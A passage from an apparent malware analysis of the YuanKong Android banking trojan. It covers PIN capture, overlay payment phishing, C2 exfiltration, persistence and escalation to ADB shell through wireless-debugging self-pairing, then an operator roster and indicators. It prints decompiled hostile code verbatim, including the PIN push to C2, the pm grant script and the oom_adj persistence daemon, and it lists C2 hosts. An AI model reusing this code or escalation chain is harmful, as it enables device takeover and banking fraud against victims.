Third, each captured tap becomes a `TouchRecord` and is serialized for exfiltration with its coordinates, the screen size, an `isLockscreen` flag, the resolved `pinDigit` and a `source` (defaulting to `passive`):

![jadx, touchRecordToMap: x, y, screenWidth/Height, isLockscreen, pinDigit, pin, source, timestamp](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/51e231afccfbab66.png)

What this leads to is cleartext recovery of the device PIN, lockscreen passcode, or pattern, in spite of the on-screen masking: the coordinate-to-digit map turns a tap position into the digit under it and the `isLockscreen` flag marks the taps that unlock the phone. Paired with the ADB-shell and accessibility remote control and the black-screen overlay (the victim sees a dark screen while the operator drives the device), it is the recipe for unattended takeover and on-device banking fraud. The operator can unlock the phone, open the banking or payment app and satisfy its PIN or re-auth prompt with the harvested PIN, with nothing visible to the victim. The `source` field defaulting to `passive` means this runs as background harvesting, not only during an armed capture.

The outcome is the same one RatHat gets from `getevent`, recovering PINs and lock patterns from where the user taps, but the coverage is narrower: YuanKong only obtains coordinates when its own overlay receives the touch or when it has mapped a specific keypad, rather than RatHat’s blanket, overlay-independent, system-wide raw-touch stream.

**Payment capture is overlay phishing.** `handleArmPaymentCapture` takes a target `packages` list and an operator-supplied `html` page; `armPaymentCapture` stores a `package` to `html` mapping and renders that HTML over the targeted app. The entered PIN comes back in cleartext:

```java
// jadx (CLI decompile), verbatim, RemoteAccessibilityService.finishPaymentCapture
PaymentPinRecord paymentPinRecord =
    new PaymentPinRecord(.., pkg, label, pin, System.currentTimeMillis(), "payment-webview", ..);
// saved to the MonitorDatabase, then pushed to C2:
companion.sendMessageDirectly(new ControlMessage(MessageType.PAYMENT_PIN_DELTA,
    { "record": { "packageName": .., "appLabel": .., "pin": pin,
                  "timestamp": .., "source": "payment-webview" } }));
companion.scheduleReliableDataBacklogUpload("payment-pin-saved", ["paymentPin"], 5000L);
```

![jadx, finishPaymentCapture: PaymentPinRecord saved to MonitorDatabase, then sent as PAYMENT\_PIN\_DELTA and queued for reliable-backlog upload](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/08eca88bab752e31.png)

**Exfil model.** Captured data is stored in a Room database (`MonitorDatabase`: `PaymentPinRecord`, `KeyInputRecord`, `TouchRecord`, `AppUsageRecord`, `EventLogRecord`) and pushed as delta messages (`PAYMENT_PIN_DELTA`, `EVENT_LOG_PUSH`). If the socket is down the records are queued and uploaded later as `RELIABLE_DATA_BATCH`, so a disconnect does not lose data.

**Persistence.** A device-admin receiver (`RemoteDeviceAdminReceiver`) resists uninstall; a set of mutually-rebinding foreground services (`WatchdogService`, `KeepAliveMeshService`, `StealthKeepAliveService`, `AccountKeepAliveService`) keeps it alive; `HIDE_APP_ICON` hides it; `REQUEST_SELF_UNINSTALL` wipes it on command; and once escalated the ADB `oom_adj` daemon makes it hard to kill.

![jadx, StealthKeepAliveService.adjustOomAdj: writes -17 to /proc//oom\_adj, directly then via su](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/8a9d9d448c875c95.png)

What it cannot do in this build is just as telling and it is provable from the manifest and the DEX. There is no `READ_SMS` / `RECEIVE_SMS`, no `READ_CONTACTS`, no `READ_CALL_LOG`, no `CAMERA` and no `RECORD_AUDIO` permission and no `content://sms`, `content://call_log`, `camera2`, `AudioRecord` or `MediaRecorder` code. `CAMERA_*` and `AUDIO_STREAM` exist as commands in the family protocol, but this sample ships no camera or microphone code and its camera handler returns an explicit unsupported stub (`当前 APK 不支持摄像头预览`, “this APK does not support camera preview”). So this is not an SMS or contact stealer. Its reach comes from the screen and the accessibility tree, which is broader: it reads and drives the victim’s banking session directly, with no per-app data permission.

### 10 Local privilege escalation via the device’s own ADB

The `io.github.muntashirakon.adb` (libadb-android) code in the child is not the C2 pairing. It pairs with the device’s **own** `adbd`, turning Android’s Wireless Debugging against the device to obtain an ADB shell the app could never hold from its sandbox.

![jadx, PairingAuthCtx: the libadb-android adb-pairing code, reused on-device](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/8623b61f98d64a4c.png)

The handshake is SPAKE2 (`createAlice` / `createBob` with the verbatim `adb pair client` / `adb pair server` role strings) and its AES-128-GCM session key is derived at runtime, never stored. `mSecretKey` starts as an empty 16-byte array and is filled only inside `initCipher`, from HKDF over the live SPAKE2 secret:

```java
// jadx, verbatim, io.github.muntashirakon.adb.PairingAuthCtx
private final byte[] mSecretKey = new byte[16];          // empty until the handshake runs
public boolean initCipher(byte[] bArr) {
    byte[] b8 = this.mSpake2Ctx.b(bArr);                 // SPAKE2 shared secret from the live peer message
    ...                                                  // HKDF-SHA256(secret=b8, info="adb pairing_auth aes-128-gcm key")
    System.arraycopy(aVar.f1908b, i11, this.mSecretKey, 0, min);   // HKDF output copied INTO mSecretKey
    ...
}
public void destroy() { Arrays.fill(this.mSecretKey, (byte) 0); ... }   // wiped on teardown
```

There is no key constant anywhere; it cannot exist until the handshake runs, which is why there was nothing static to extract. The chain pairs accessibility abuse with autonomous on-device ADB self-pairing to break out of the app sandbox, then stages a native daemon that runs at shell privilege. Step by step from the decompiled code:

1.  It enables Wireless Debugging itself, through accessibility. The `LocalAdbGuard` routine (`k4.p1.f`) checks whether it already holds `WRITE_SECURE_SETTINGS` and, if not, writes `adb_wifi_enabled = 1` directly through `Settings.Global`, then uses libadb-android’s `AdbMdns` (`SERVICE_TYPE_ADB`) to discover the daemon the system just brought up. `GuardianService` watches `Settings.Global.adb_wifi_enabled` to keep it on.

![jadx, k4.p1.f (LocalAdbGuard): Settings.Global.putInt(“adb\_wifi\_enabled”, 1) and AdbMdns.SERVICE\_TYPE\_ADB discovery](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/b9a8c6f952c26434.png)

2.  It scrapes the pairing credentials off the system pairing dialog. The parser `k4.z5` compiles a six-digit code pattern (`(\d{3})[  ]?(\d{3})`, two groups of three digits) and several port patterns, including one keyed to the word “port” in English and Chinese (`(?:port|端口|連接埠|连接埠)...(\d{2,5})`):

![jadx, k4.z5: the six-digit pairing-code regex and the port regexes](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/d7ce43bbf1e68251.png)

Those patterns are applied inside a recursive walk of the dialog’s accessibility node tree (`RemoteAccessibilityService.wireframeRootLooksLikePairingDialog$visit$329`). For each node it reads both the text (`getText()` and `getContentDescription()`) and the resource-id name (`getViewIdResourceName()`) and it accepts a value either when the resource-id name matches (`pairing_code`, `adb_pairing`, `ip_addr`, `pairing_port`) or when the six-digit and port regexes match the node’s text. It therefore does not depend on the resource IDs: when they are missing or renamed, the text match still recovers the code and port and the walk descends into every child node (bounded by a node cap and a depth of 18), so it reads the dialog by content, not only by known IDs.

![jadx, the node walk: getViewIdResourceName plus the z5 regexes over node text, recursing into every child](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/5542fefda6700b99.png)

3.  It connects to the local `adbd` on loopback and pairs with it using the scraped code: `AdbScreenCaptureController` and `AdbUiTreeController` open `d3.s(5555, context, "127.0.0.1")` and the activation UI fixes the host to `127.0.0.1:5555` (`主机（固定 127.0.0.1）`).
    
4.  Over that shell it runs commands the sandboxed app never could. `SelfGrantManager.grantWriteSecureSettingsToSelf` opens the stream (the libadb `d3` / `a2` helpers) and executes `pm grant` directly, after logging “Attempting to grant WRITE_SECURE_SETTINGS to self”:
    

![jadx, SelfGrantManager: pm grant  android.permission.WRITE\_SECURE\_SETTINGS executed over the libadb AdbStream](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/bf97f2bdce82f404.png)

A batch script (`AdbAdvancedKeepAliveManager`, “ADB权限授予脚本”, ADB permission-granting script) grants the rest over the same shell:

```bash
# jadx, verbatim, AdbAdvancedKeepAliveManager  ("ADB权限授予脚本", ADB permission-granting script)
adb shell pm grant <pkg> android.permission.WRITE_SECURE_SETTINGS
adb shell pm grant <pkg> android.permission.DUMP
adb shell pm grant <pkg> android.permission.PACKAGE_USAGE_STATS
adb shell dumpsys deviceidle whitelist +<pkg>
```

5.  And installs an unkillable daemon:

```bash
# jadx, verbatim, IntegratedKeepAliveManager$createSystemDaemon  ->  /data/local/tmp/remote_control_daemon.sh
while true; do
  if ! pgrep -f "$PACKAGE"; then am startservice -n "$PACKAGE/.service.ConnectionService"; fi
  for PID in $(pgrep -f "$PACKAGE"); do
    echo -17   > /proc/$PID/oom_adj
    echo -1000 > /proc/$PID/oom_score_adj
  done
done
```

Writing `/proc/<pid>/oom_adj` is not possible from an app sandbox. This is escalation from the app to the ADB `shell` user (uid 2000), not a root exploit, though `UltimateKeepAliveManager` will also try `su` opportunistically on a rooted device. The whole flow is exposed to the panel as the `LOCAL_ADB_ACTIVATE` / `LOCAL_ADB_PREPARE` / `LOCAL_ADB_CAPTURE` commands.

**This technique is not unique to YuanKong and it has been reported publicly.** The pattern of an Android app using accessibility to enable Wireless Debugging and then pairing with the device’s own `adbd` for a local shell, with no PC and without root, has appeared in at least two unrelated families reported in 2026. Pradeo described it in RedHook in July 2026, where the app enables wireless debugging through accessibility and runs the ADB component on the phone itself so that, in their words, “the device thus becomes its own host,” reusing code from the open-source Shizuku framework ([Pradeo, 2026-07-23](https://blog.pradeo.com/redhook-the-banking-trojan-that-grants-itself-system-level-access-on-android)). Zimperium described it in RatHat in September 2026 and that write-up names the same building block seen here: the app, “utilizing the embedded libadb-android library … authenticates against the local device’s ADB daemon,” scrapes the six-digit pairing code and port from the dialog through accessibility and runs `pm grant` for `WRITE_SECURE_SETTINGS` over the resulting shell ([Zimperium, 2026-09-16](https://zimperium.com/blog/rathat-ai-powered-mobile-threat-is-here-for-your-credentials-bank-accounts)). YuanKong is a distinct family (different package namespace, different C2, different config crypto), so this is shared tradecraft, not shared code. What the decompiler adds for these samples specifically is the exact pairing primitive, the libadb-android SPAKE2 handshake with the `adb pairing_auth aes-128-gcm key` HKDF derivation shown above, the fixed `127.0.0.1:5555` loopback target and the precise set of permissions the shell grants.

### 11 From one sample to the operator roster

Because the operator fields are compiled in, static extraction scales. Running the same unpack-and-read across our collection, 110 YuanKong droppers delivering 57 distinct child payloads, all signed by the one `73cbe8e3730cacfdd208f22eab468bb5495a78c0eb2cb37eff5af0cafe321387` certificate, yields 42 distinct operator accounts and 44 rotating build brands. Each account carries its own six-digit enrollment code; each build uses a fresh brand (`echorelay`, `atlaswave`, `fluxlink`, `zenithwave` and so on) and a matching package (`net.echorelay.app`, `net.atlaswave.app` and so on).

To show multi-tenancy in the decompiler rather than assert it, here is a second, unrelated sample from the set: dropper `d96056e9f00bb82c621be36f6a7c5c1f47cce61d11be141ee976c0092c8693b1`, child `5e4d1980f76e571dd0300b9fa356818f874528fc0517d0d0e0afb7e561904764`, operator `xx7876`. Its config class is obfuscated under a different name (`k4.i2` here, versus `k4.l3` in the first sample), yet the `d()` / `e()` / `f()` getter structure is identical and the account values are its own:

![jadx, second sample config class k4.i2: e() returns account\_mqo1wao3\_5b331d1cda64 and f() returns xx7876, a different operator from the first sample](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/39c027938ff36ba4.png)

And its signing certificate is the same one every YuanKong child carries, down to the serial number and SHA-256:

![jadx, second sample APK signature: the same CN=Remote Control, O=YuanKong certificate, SHA-256 73CBE8E3…321387, serial 0xc8f480c186f56f68](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/719ec085cde48d1a.png)

Same certificate, different operator. Swap the sample and the account identifiers (`apkAccountId` `account_mulcetn2_9d226b242cac` to `account_mqo1wao3_5b331d1cda64`, `apkAccountName` `lichunfeng7` to `xx7876`) change while the signer does not. That is the shared-codebase, per-operator-account structure, shown side by side.

The handles share stems with numeric suffixes: `lichunfeng`, `lichunfeng4`, `lichunfeng5`, `lichunfeng6`, `lichunfeng7`; `lx`, `lx2-001` through `lx5-001`; `xxy`, `xxy2-001` through `xxy5-001`; `xlb` through `xlb5-001`; `wy`, `wy2/3/5-001`; `laizi`, `laizi2/4-001`; `dahai`, `dahai3/4-001`. One build ships the factory defaults: `apkAccountId=default`, enrollment `123456`.

The full roster, all 42 accounts, extracted statically from the set without ever contacting the C2. `Builds` counts the distinct child payloads tied to each account; they sum to the 57 distinct children in our collection. The example column shows one of each account’s build brands and its package; accounts with more than one build rotate the brand on each.

| Operator handle | Builds | apkAccountId | Enrollment | Example brand to package |
| --- | --- | --- | --- | --- |
| `laiqian2-001` | 3   | `account_mslgi17w_86c998f79a04` | `426759` | echoplayer to `com.echoplayer.app` |
| `baodan001` | 2   | `account_mrjzy2x7_85671e1a6191` | `556422` | novabridge to `io.novabridge.app` |
| `baofu001` | 2   | `account_mqtptc8f_643b7b952d18` | `192731` | prismnode to `app.prismnode.app` |
| `dahai4-001` | 2   | `account_muxwiqpg_7309f0afb553` | `252110` | atlasbridge to `com.atlasbridge.app` |
| `laiqian001` | 2   | `account_mslghyrc_1c0efdef89ed` | `478805` | swiftviewer to `app.swiftviewer.app` |
| `laizi001` | 2   | `account_msr7dfm0_3210d4da0e88` | `154652` | novawave to `com.novawave.app` |
| `laizi4-001` | 2   | `account_msr7dsg0_6f6437e4c253` | `126237` | orbitstation to `com.orbitstation.app` |
| `lichunfeng7` | 2   | `account_mulcetn2_9d226b242cac` | `863456` | echorelay to `net.echorelay.app` |
| `lx3-001` | 2   | `account_msh4p94w_ab9174e5a058` | `966408` | atlaslink to `app.atlaslink.app` |
| `lx5-001` | 2   | `account_mucgaqvz_b71f5673a748` | `832336` | atlaswave to `com.atlaswave.app` |
| `wm2-001` | 2   | `account_msfn5b26_94c57ff4f7e4` | `825287` | prismnode to `com.prismnode.app` |
| `xxy001` | 2   | `account_msxnil2c_256d36dc3646` | `438132` | deltaviewer to `io.deltaviewer.app` |
| `xxy3-001` | 2   | `account_mszw1v45_a61972b00f41` | `909410` | swiftlink to `app.swiftlink.app` |
| `xxy5-001` | 2   | `account_mt6qxocd_3020b6391fd8` | `956228` | echoplayer to `net.echoplayer.app` |
| `baofa001` | 1   | `account_mqtqkjp7_2b5daafab08c` | `691205` | fluxlink to `app.fluxlink.app` |
| `bjb001` | 1   | `account_mrugouex_be3872f27d09` | `398214` | echolink to `net.echolink.app` |
| `dahai001` | 1   | `account_mup6liij_6a377bb62e50` | `821501` | swiftviewer to `io.swiftviewer.app` |
| `dahai3-001` | 1   | `account_muxwin8h_2bf62afc2b5f` | `944708` | atlasportal to `net.atlasportal.app` |
| `dashu001` | 1   | `account_mtnbek2s_6cfce404af3f` | `808522` | orbitstation to `app.orbitstation.app` |
| `gq3-001` | 1   | `account_mu8o2g10_00ea94aa3eaf` | `501607` | peakportal to `app.peakportal.app` |
| `laizi2-001` | 1   | `account_msr7dkxf_4fef2560bfce` | `297742` | orbitbridge to `org.orbitbridge.app` |
| `lichunfeng` | 1   | `default` | `123456` | orbitlink to `org.orbitlink.app` |
| `lichunfeng4` | 1   | `account_mtnbfndo_8d68a3b973d3` | `848849` | orbitwave to `org.orbitwave.app` |
| `lichunfeng5` | 1   | `account_mty2okdg_83248f5128f4` | `908825` | echoviewer to `net.echoviewer.app` |
| `lichunfeng6` | 1   | `account_mtzurzjg_3b7ebfb942c1` | `567741` | prismstation to `io.prismstation.app` |
| `lx-ng-001` | 1   | `account_mrdgd2zo_8ee77f640a09` | `888659` | prismbridge to `org.prismbridge.app` |
| `lx2-001` | 1   | `account_mqyzy34p_93690c8f8031` | `919531` | echobridge to `net.echobridge.app` |
| `lx4-001` | 1   | `account_msh4p6sb_137a324cae05` | `978780` | fluxlink to `com.fluxlink.app` |
| `wm001` | 1   | `account_mrugos00_807034146896` | `891284` | orbitviewer to `app.orbitviewer.app` |
| `wy001` | 1   | `account_mqpqq8k6_9621ddc4dda8` | `673760` | orbitrelay to `io.orbitrelay.app` |
| `wy2-001` | 1   | `account_msh4pbip_da93ced98c52` | `673193` | prismbridge to `net.prismbridge.app` |
| `wy3-001` | 1   | `account_mslgi3bn_3177bbf3aa4d` | `914315` | fluxplayer to `net.fluxplayer.app` |
| `wy5-001` | 1   | `account_mt1wctfr_0fb8743884d2` | `690617` | zenithbridge to `com.zenithbridge.app` |
| `xlb001` | 1   | `account_ms0fbb1g_d0cc1402c246` | `480915` | fluxnode to `app.fluxnode.app` |
| `xlb2-001` | 1   | `account_mtzqgajd_e1800d5f9e7b` | `510958` | peakwave to `org.peakwave.app` |
| `xlb3-001` | 1   | `account_mu1bb32v_a2a9b118c44f` | `822247` | atlaswave to `com.atlaswave.app` |
| `xlb4-001` | 1   | `account_mulceqou_a2e275845aa7` | `670085` | zenithwave to `org.zenithwave.app` |
| `xlb5-001` | 1   | `account_muuu865i_a06d6e72766c` | `274610` | zenithportal to `io.zenithportal.app` |
| `xx7876` | 1   | `account_mqo1wao3_5b331d1cda64` | `317098` | peakviewer to `org.peakviewer.app` |
| `xx7878` | 1   | `account_mqguwwx3_32802e6a3545` | `660862` | atlasrelay to `app.atlasrelay.app` |
| `xxy2-001` | 1   | `account_msxninaj_437bcaf7022e` | `755777` | peaklink to `org.peaklink.app` |
| `yx001` | 1   | `account_mrugowx3_549d8b8a9d4a` | `378645` | fluxrelay to `io.fluxrelay.app` |

Each row is a discrete account, extracted without ever contacting the C2.

## Conclusions

For defenders, three things follow. The reliable family signal is the shared child certificate `73cbe8e3730cacfdd208f22eab468bb5495a78c0eb2cb37eff5af0cafe321387`, which survives every package-name, brand and account rotation, so hunt on the signer, not the package. The reliable C2 signal is the small shared host set (`apppanda[.]xyz`, `ktxapp[.]com`, `ktx123[.]net`, `206.82.1.14`) plus a persistent Socket.IO/WebSocket control channel. The out-of-place libadb-android adb-pairing symbols inside a `com.remote.control.*` app are a second strong signal, but of local privilege escalation (self-pairing with the device’s own `adbd`), not of C2. The attribution signal is already in the binary: `apkAccountId`, `apkAccountName` and `apkAccountBindId` are string constants and are echoed in the beacon, so a single static pass over a collection recovers the operator roster, in our case 42 accounts across 110 droppers.

I have listed the indicators below the way I always do: the C2 hosts first, then the crypto parameters and signer hashes that generalise across the family, then the specific sample artifacts. I have not listed the `f5672e` package names as indicators. They are internal seed strings for the device-identity generator, not the malware’s own package or C2, so listing them would add noise without value.

## Indicators of compromise

Domains are defanged with brackets. “Context” notes how durable each indicator is across the family.

| Type | Indicator | Context |
| --- | --- | --- |
| C2 host | `apppanda[.]xyz` | Shared relay set, all tenants. |
| C2 host | `ktxapp[.]com`, `www.ktxapp[.]com` | Shared relay set. |
| C2 host | `ktx123[.]net`, `www.ktx123[.]net` | Shared relay set. |
| C2 host | `206.82.1.14` | Hardcoded IP, present in DEX, in all family records. The `ktx` domains resolved to this IP on 2026-10-15. |
| Cert SHA-256 | `73cbe8e3730cacfdd208f22eab468bb5495a78c0eb2cb37eff5af0cafe321387` | Family anchor. Signs all 57 YuanKong child payloads. `O=YuanKong, CN=Remote Control, L=Beijing`. |
| Cert SHA-256 | `af92f7d616564dabffb0679a1a38fb24d6a6c4e4a90114c6eb0834c57dd456c9` | Nova packer signer. `O=Nova, OU=APK Factory, C=SG`. |
| App class | `com.remote.control.RemoteControlApp` | YuanKong child application class. |
| Loader package | `com.system.loader.va363d031` | Nova SVLT vault dropper (this build). |
| Vault | `assets/vault-config.json` + `SVLT` -magic blob | `SVLT` + version `02` + `ivlen` + IV + XOR ciphertext; key and IV in cleartext. |
| Crypto | `plain = ct ^ key ^ iv` (“SVLT-XOR-v2”) | Reversible from config alone. |
| C2 channel | Socket.IO/engine.io over WebSocket (okhttp, `wss`); typed JSON `ControlMessage`; no app-layer key (TLS only) | Transport across the family. |
| Local escalation | Wireless-ADB self-pairing (libadb-android SPAKE2, `adb pairing_auth aes-128-gcm key`, runtime-derived) gives a local shell on `127.0.0.1:5555`, used to `pm grant WRITE_SECURE_SETTINGS` and drop `/data/local/tmp/remote_control_daemon.sh` | Generalises across the family. |
| Capabilities | Screen capture/stream, accessibility credential capture, payment-PIN capture, remote input, file exfil (`/api/file-transfers`), clipboard, notification/OTP read, location | From the `MessageType` command set. |
| Config fields | `apkAccountId`, `apkAccountName`, `apkAccountBindId`, `apkOwnerSource` | Operator identity, compiled in and beaconed. |
| Dropper SHA-256 | `675d083b63e2169e8fd0ac0cfd27904005b5e2be00f6e3489f6e47fc4c57a4d1` | This sample (dropper). MD5 `4280a408a7f0490d9d2eaa3f536f339b`. |
| Child SHA-256 | `12480408006dece2fa756b3572766eecb6fb2144a1226f4e21c4cb7d54383105` | Unpacked child `net.echorelay.app`. MD5 `2fe7803a60175e27d8a2934c020e6413`. |
| Vault blob SHA-256 | `5f682a13639b6234bc5dbee43c24085140b4ccacd558884c1460352072d3157f` | `assets/cx58vmnqxuh6059a` (encrypted payload). |
| Operator | `apkAccountName=lichunfeng7`, `apkAccountId=account_mulcetn2_9d226b242cac`, enrollment `863456` | This build’s account. |
| Dropper SHA-256 | `d96056e9f00bb82c621be36f6a7c5c1f47cce61d11be141ee976c0092c8693b1` | Second sample (dropper), operator `xx7876`. |
| Child SHA-256 | `5e4d1980f76e571dd0300b9fa356818f874528fc0517d0d0e0afb7e561904764` | Second sample child `org.peakviewer.app`, same cert `73cbe8e3…321387`. |
| Operator | `apkAccountName=xx7876`, `apkAccountId=account_mqo1wao3_5b331d1cda64`, enrollment `317098` | Second sample’s account. |
